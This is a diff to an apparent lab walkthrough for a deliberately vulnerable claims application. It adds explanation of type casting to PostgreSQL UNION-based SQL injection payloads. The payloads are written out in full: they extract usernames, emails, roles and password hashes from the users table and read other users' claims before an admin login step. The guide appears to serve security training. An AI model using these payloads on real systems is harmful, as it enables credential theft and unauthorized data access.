@@ -108,10 +108,12 @@ Enter the following payload in the search box:
 x' UNION SELECT id::text, username, email, username, role, NULL::text, role, created_at::text, NULL::text, NULL::text, NULL::text, NULL::text FROM users -- 
 ```
 
+> **Why so many `::text` casts?** The first `SELECT *` returns the `claims` table's native types (Integer at columns 1, 2, 3, 11; Float at column 6; DateTime at columns 9, 10). PostgreSQL requires **exact type matches** in a `UNION`. Every non-text column in the UNION SELECT must be cast to `text` to match, and text columns must NOT be cast (to avoid text-vs-varchar mismatches).
+
 This maps user data to the columns the template renders:
 
 | Template column        | Displays           | `users` value      |
-|------------------------|--------------------|--------------------|
+|------------------------|--------------------|--------------------| 
 | ID (`row[0]`)          | User ID            | `id::text`         |
 | Title (`row[3]`)       | **Username**       | `username`         |
 | Amount (`row[5]`)      | (empty, avoids format error) | `NULL::text` |
@@ -138,7 +140,7 @@ This places `password_hash` in the **Title** column (`row[3]`), which renders as
 x' UNION SELECT id::text, user_id::text, claim_type_id::text, title, description, amount::text, status, additional_details, created_at::text, updated_at::text, reviewed_by::text, review_notes FROM claims WHERE user_id != 1 -- 
 ```
 
-This returns claims belonging to all other users.
+This returns claims belonging to all other users. Note that integer columns (`id`, `user_id`, `claim_type_id`, `reviewed_by`), the float column (`amount`), and datetime columns (`created_at`, `updated_at`) are all cast to `::text` to match the types expected by the first SELECT.
 
 ### Step 7 — Log in as the OIC user
 
